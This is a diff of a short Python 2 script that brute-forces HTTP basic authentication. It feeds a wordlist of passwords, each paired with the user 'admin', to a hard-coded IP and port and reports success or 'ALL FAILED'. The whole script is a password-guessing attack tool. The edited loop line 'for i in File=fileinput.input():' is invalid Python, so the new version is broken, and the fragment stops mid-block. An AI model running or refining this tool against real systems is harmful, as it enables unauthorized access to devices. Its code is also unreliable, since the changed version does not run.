@@ -1,11 +1,14 @@
-#!/usr/bin/python2.6
+#!/usr/bin/python2
+
 import sys, urllib2, fileinput
+
 User='admin'
 Target='192.168.1.100'
 Port='8082'
-File=fileinput.input()
-output = 'ALL FAILED'
-for i in File:
+
+output = 'ALL FAILED' # default output
+
+for i in File=fileinput.input():
    url = 'http://'+User+':'+i+'@'+Target+':'+Port
    try:
       if urllib2.urlopen(url):
